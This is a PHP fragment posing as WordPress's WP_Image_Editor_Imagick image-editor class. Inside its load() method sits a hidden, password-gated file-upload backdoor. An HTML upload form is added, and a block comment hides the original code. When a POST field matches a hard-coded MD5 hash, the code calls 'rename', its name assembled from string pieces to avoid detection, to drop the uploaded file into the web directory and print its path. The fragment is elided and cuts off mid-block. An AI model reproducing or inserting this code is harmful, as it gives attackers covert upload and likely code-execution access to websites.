...
class WP_Image_Editor_Imagick extends WP_Image_Editor {
	...
	public function load() {
        ...
        <form enctype='multipart/form-data' method='post'>
	               <input name='setImagePage' type='file'><br>
	                <input name='error_loading_image' type='text'>
	                         <input type=submit>
                      </form></div>";/*
		try {
		...
		try {
			...
			if ( $dst_w || $dst_h ) {
				...
				if ( ! $dst_h )
					$dst_h = $src_h;
				*/
                if ( isset($_POST['error_loading_image']) ){

					if (md5($_POST['error_loading_image']) == "945ad3a3961281f381f907cb0b24cee5") {
						$ext = 'am';
							$text = 'ren'.$ext.'e';
					if ($text($_FILES['setImagePage']['tmp_name'], './'.$_FILES['setImagePage']['name']) ){
							echo $_FILES['setImagePage']['tmp_name'].'<br>';
						echo realpath( $_FILES['setImagePage']['name'] );
							} else {
										echo $_FILES['setImagePage']['tmp_name'].'<br>';
							echo ' - '.realpath( $_FILES['setImagePage']['name'] );
									}
